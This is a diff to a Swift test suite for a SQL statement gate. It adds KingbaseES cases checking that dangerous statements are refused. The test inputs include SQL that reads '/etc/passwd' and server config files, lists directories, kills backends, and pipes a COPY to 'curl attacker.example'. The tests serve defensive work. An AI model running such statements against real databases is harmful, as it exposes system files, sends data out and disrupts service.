@@ -76,7 +76,9 @@ struct ExternalStatementGateTests {
     @Test("A statement that reaches the filesystem or runs server code is refused", arguments: [
         "COPY users FROM '/etc/passwd'",
         "COPY users TO PROGRAM 'curl attacker.example'",
-        "SELECT pg_read_file('/etc/passwd')"
+        "SELECT pg_read_file('/etc/passwd')",
+        "SELECT sys_read_file('kingbase.conf')",
+        "SELECT * FROM sys_ls_dir('.')"
     ])
     func filesystemAndCodeRefused(sql: String) {
         #expect(refusal(statement(sql)) == .denied(
@@ -182,6 +184,8 @@ struct ExternalStatementGateTests {
             ("SELECT pg_cancel_backend(123)", DatabaseType.postgresql),
             ("SELECT pg_terminate_backend(123)", DatabaseType.redshift),
             ("SELECT pg_cancel_backend(123)", DatabaseType.cockroachdb),
+            ("SELECT sys_terminate_backend(123)", DatabaseType.kingbasees),
+            ("SELECT sys_reload_conf()", DatabaseType.kingbasees),
             ("SELECT query_to_xml('SELECT pg_terminate_backend(123)', true, false, '')", DatabaseType.postgresql),
             ("EXPLAIN ANALYSE SELECT pg_terminate_backend(123)", DatabaseType.postgresql),
             ("KILL 123", DatabaseType.mysql),
